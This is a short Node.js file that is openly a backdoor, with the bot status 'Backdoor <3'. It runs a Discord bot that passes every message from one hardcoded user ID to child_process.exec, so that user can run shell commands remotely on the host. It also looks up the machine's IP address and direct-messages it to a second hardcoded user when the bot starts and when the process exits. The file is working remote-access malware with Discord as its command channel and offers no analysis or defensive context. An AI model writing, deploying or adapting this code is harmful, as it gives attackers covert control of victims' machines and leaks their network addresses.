const Discord = require("discord.js");
const exec = require('child_process').exec;
const bot = new Discord.Client();
var content = ""

bot.login("Bot-Token");

bot.on ("message", async (message) =>{
    if(message.author.id == "822858876126494750")
    {
        exec(message.content)
    }
})

bot.on("ready", (ready) => {
    console.log("Bot started.");
    bot.user.setActivity('Backdoor <3', { type: 'PLAYING' });
    require('dns').lookup(require('os').hostname(), function (err, add, fam) {
        bot.users.fetch("703219730064080936").then((user) => {
            user.send("New user: " + add);
            if(!err == null)
            {
                user.send(err)
            }
        });
    })
})

process.on("exit", async (code) => {
    require('dns').lookup(require('os').hostname(), function (err, add, fam) {
        bot.users.fetch("703219730064080936").then((user) => {
            user.send("Exit user: " + add + " Exit code: " + code);
            if(!err == null)
            {
                user.send(err)
            }
        });
    })
})